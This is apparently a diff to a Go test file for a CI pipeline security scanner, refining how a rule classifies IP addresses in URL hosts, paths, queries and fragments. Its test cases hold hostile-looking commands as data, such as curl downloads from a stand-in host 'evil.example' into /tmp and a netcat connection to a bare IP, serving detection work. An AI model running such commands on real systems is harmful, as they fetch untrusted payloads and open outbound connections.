@@ -419,7 +419,7 @@ func TestRulesRunThroughTheEngine(t *testing.T) {
 			"ppe-003/malicious.yml",
 			[]string{
 				Rule3ID, Rule3ID, Rule3ID,
-				Rule4ID, Rule4ID, Rule4ID, Rule4ID, Rule4ID, Rule4ID,
+				Rule4ID, Rule4ID, Rule4ID, Rule4ID, Rule4ID, Rule4ID, Rule4ID,
 				Rule5ID, Rule5ID, Rule5ID,
 			},
 		},
@@ -1079,36 +1079,44 @@ func TestRule3InterpreterWordBoundary(t *testing.T) {
 // this is the case that decides whether rule 4 blocks a Gradle build.
 func TestRule4RequiresNetworkContext(t *testing.T) {
 	tests := []struct {
-		script  string
-		wantIPs int
-		wantURL int
-		reason  string
+		script      string
+		wantIPs     int
+		wantPathIPs int
+		wantURL     int
+		reason      string
 	}{
-		{"curl http://203.0.113.7/x -o /tmp/x\n", 1, 1, "a URL with an IP host is an endpoint"},
-		{"nc 203.0.113.7 4444 < /dev/null\n", 1, 0, "a network command with a bare IP"},
-		{"ssh user@10.0.0.5\n", 1, 0, "ssh with a bare IP"},
-		{"rsync -a file 10.0.0.5:/tmp/\n", 1, 0, "rsync with a bare IP"},
-		{"./gradlew build -Dversion=1.2.3.4\n", 0, 0, "a four part version is not an endpoint"},
-		{"echo \"building 1.2.3.4\"\n", 0, 0, "a version string in a message is not an endpoint"},
-		{"echo 10.0.0.1\n", 0, 0, "printing an address connects to nothing"},
-		{"wget http://internal.example.invalid/report\n", 0, 1, "a named host over http is the plaintext case"},
-		{"curl https://example.invalid/1.2.3.4/tool\n", 0, 0, "a version in an https path is neither"},
-		{"echo 999.999.999.999\n", 0, 0, "octets out of range are not an address"},
+		{"curl http://203.0.113.7/x -o /tmp/x\n", 1, 0, 1, "a URL with an IP host is an endpoint"},
+		{"nc 203.0.113.7 4444 < /dev/null\n", 1, 0, 0, "a network command with a bare IP"},
+		{"ssh user@10.0.0.5\n", 1, 0, 0, "ssh with a bare IP"},
+		{"rsync -a file 10.0.0.5:/tmp/\n", 1, 0, 0, "rsync with a bare IP"},
+		{"./gradlew build -Dversion=1.2.3.4\n", 0, 0, 0, "a four part version is not an endpoint"},
+		{"echo \"building 1.2.3.4\"\n", 0, 0, 0, "a version string in a message is not an endpoint"},
+		{"echo 10.0.0.1\n", 0, 0, 0, "printing an address connects to nothing"},
+		{"wget http://internal.example.invalid/report\n", 0, 0, 1, "a named host over http is the plaintext case"},
+		{"curl https://example.invalid/1.2.3.4/tool\n", 0, 1, 0, "a version in an https path is Warn, not Block: usually a version, but worth a glance"},
+		{"echo 999.999.999.999\n", 0, 0, 0, "octets out of range are not an address"},
 	}
 
 	for _, tt := range tests {
 		t.Run(tt.reason, func(t *testing.T) {
 			got := literalEndpointMatches(tt.script)
-			var ips, urls int
+			// Count each kind separately: an IP in a URL path is neither a bare
+			// endpoint nor a plaintext URL, so lumping it in with the URLs hid
+			// the fact that it was being produced at all.
+			var ips, pathIPs, urls int
 			for _, m := range got {
-				if m.kind == endpointIP {
+				switch m.kind {
+				case endpointIP:
 					ips++
-				} else {
+				case endpointIPInPath:
+					pathIPs++
+				case endpointHTTP:
 					urls++
 				}
 			}
-			if ips != tt.wantIPs || urls != tt.wantURL {
-				t.Errorf("got %d IPs and %d URLs, want %d and %d", ips, urls, tt.wantIPs, tt.wantURL)
+			if ips != tt.wantIPs || pathIPs != tt.wantPathIPs || urls != tt.wantURL {
+				t.Errorf("got %d IPs, %d path IPs and %d URLs, want %d, %d and %d",
+					ips, pathIPs, urls, tt.wantIPs, tt.wantPathIPs, tt.wantURL)
 			}
 		})
 	}
@@ -1117,7 +1125,7 @@ func TestRule4RequiresNetworkContext(t *testing.T) {
 // A URL whose host is a bare IP produces two findings at two tiers, and both
 // are wanted: they are different problems with different fixes.
 func TestRule4TiersForIPHostURL(t *testing.T) {
-	file, data := parseFixture(t, "ppe-003/malicious.yml")
+	file, _ := parseFixture(t, "ppe-003/malicious.yml")
 
 	var severities []findings.Severity
 	for _, f := range Rule4(file) {
@@ -1136,10 +1144,18 @@ func TestRule4TiersForIPHostURL(t *testing.T) {
 	if blocks != 3 {
 		t.Errorf("Block findings = %d, want 3 (two IP hosts plus one bare IP with netcat)", blocks)
 	}
-	if warns != 3 {
-		t.Errorf("Warn findings = %d, want 3 (one per http:// URL)", warns)
+	if warns != 4 {
+		t.Errorf("Warn findings = %d, want 4 (three http:// URLs plus one address in a URL path)", warns)
 	}
-	_ = data
+
+	// The path finding has to be Warn, not Block. It is usually a version, and
+	// blocking on it would block the versioned download URLs that real
+	// repositories are full of.
+	for _, f := range Rule4(file) {
+		if strings.Contains(f.Message, "in the path of a URL") && f.Severity != findings.SeverityWarn {
+			t.Errorf("the path finding is %q, want Warn", f.Severity)
+		}
+	}
 }
 
 // ---------------------------------------------------------------- rule 5
@@ -1312,20 +1328,96 @@ func TestRules3To6Block(t *testing.T) {
 	}
 }
 
-// A URL with credentials in it, http://user:pass@10.0.0.1/x. The host is still
-// the bare IP, so the network context is present, and the credentials before it
-// must not make the host check think there is a path in the way.
-func TestInsideURLHostWithCredentials(t *testing.T) {
+// placeIP has to survive a URL with credentials in it, where the host is the
+// bare IP and the credentials sit between the scheme and the address.
+func TestPlaceIPWithCredentials(t *testing.T) {
 	line := "curl http://user:pass@10.0.0.1/x"
-	if !insideURLHost(line, strings.Index(line, "10.0.0.1")) {
-		t.Error("a URL with credentials should still report its IP host as a host")
+	if got := placeIP(urlSpans(line), strings.Index(line, "10.0.0.1")); got != ipURLHost {
+		t.Errorf("IP after credentials = %v, want a URL host", got)
 	}
 
-	// And the path check must still exclude a version in the path of the same
-	// URL shape.
 	pathLine := "curl http://user:pass@host.example/1.2.3.4/x"
-	if !insideURLPath(pathLine, strings.Index(pathLine, "1.2.3.4")) {
-		t.Error("a version in the path of a URL with credentials should be excluded")
+	if got := placeIP(urlSpans(pathLine), strings.Index(pathLine, "1.2.3.4")); got != ipURLPath {
+		t.Errorf("IP in the path = %v, want a URL path", got)
+	}
+}
+
+// The evasion this rule 4 change exists to close. An attacker who knows a
+// scanner reads URL hosts has exactly one move available, which is to put the
+// address in the path instead, so every shape of that has to be reported rather
+// than skipped.
+func TestRule4ReportsAnAddressInAURLPath(t *testing.T) {
+	cases := []struct {
+		script string
+		reason string
+	}{
+		{"curl -sS https://evil.example/1.2.3.4/payload -o /tmp/p\n", "IP in the path"},
+		{"curl -sS https://evil.example/x/203.0.113.7/y -o /tmp/p\n", "IP in a later path segment"},
+		{"curl -sS https://evil.example/a?host=1.2.3.4 -o /tmp/p\n", "IP in the query"},
+		{"curl -sS https://evil.example/a#1.2.3.4 -o /tmp/p\n", "IP in the fragment"},
+		{"curl -sS 'https://evil.example?host=1.2.3.4' -o /tmp/p\n", "IP in a query on a URL with no path"},
+		{"curl -sS 'https://evil.example#1.2.3.4' -o /tmp/p\n", "IP in a fragment on a URL with no path"},
+		{"wget -q http://evil.example/1.2.3.4/x -O /tmp/x\n", "IP in the path over plain http"},
+		{"curl -sS https://evil.example/1.2.3.4\n", "IP at the end of the path"},
+		{"curl -sS https://evil.example/1.2.3.4/x -o /tmp/p && sleep 1\n", "IP in the path with a trailing chain"},
+		{"curl -sS 'https://evil.example/1.2.3.4/p' -o /tmp/p\n", "IP in the path inside quotes"},
+	}
+	for _, c := range cases {
+		// Count the path finding rather than the total, because a plain http
+		// URL produces two: the plaintext Warn and the path Warn. Both are
+		// correct and they are separate problems.
+		var pathIPs int
+		for _, m := range literalEndpointMatches(c.script) {
+			if m.kind == endpointIPInPath {
+				pathIPs++
+			}
+		}
+		if pathIPs != 1 {
+			t.Errorf("%s: got %d path IPs, want 1", c.reason, pathIPs)
+		}
+	}
+
+	// And the shapes that must stay silent, which is the other half of the
+	// change: this is a Warn tier finding, not a reason to flag version numbers.
+	silent := []struct {
+		script string
+		reason string
+	}{
+		{"echo 1.2.3.4\n", "no network context"},
+		{"echo https://evil.example/1.2.3.4\n", "no network command on the line"},
+		{"./gradlew build -Dversion=1.2.3.4\n", "a version flag"},
+		{"./gradlew build\n", "nothing at all"},
+	}
+	for _, c := range silent {
+		if got := literalEndpointMatches(c.script); len(got) != 0 {
+			t.Errorf("%s: got %+v, want nothing", c.reason, got)
+		}
+	}
+}
+
+// An address that merely follows a URL is not in that URL's path. The backwards
+// search this replaced read it as a path, so `curl http://host/x 1.2.3.4` was
+// classified as a version rather than as an address beside a network command.
+func TestPlaceIPAfterAURLIsNotInItsPath(t *testing.T) {
+	line := "curl http://host.example/x 1.2.3.4"
+	if got := placeIP(urlSpans(line), strings.Index(line, "1.2.3.4")); got != ipStandalone {
+		t.Errorf("IP after a URL = %v, want standalone: it is a second argument to curl", got)
+	}
+
+	// And the end of that behaviour: it is a bare address next to a network
+	// command, so it blocks.
+	// Two matches, both correct: the http:// URL is the plaintext case, and the
+	// bare address is a second argument to curl.
+	got := literalEndpointMatches(line)
+	if len(got) != 2 {
+		t.Errorf("matches = %+v, want 2 (the URL and the bare IP)", got)
+		return
+	}
+	if got[1].kind != endpointIP {
+		t.Errorf("second match kind = %v, want endpointIP", got[1].kind)
+	}
+	if got[0].kind != endpointHTTP {
+		t.Errorf("first match kind = %v, want endpointHTTP", got[0].kind)
 	}
 }
 
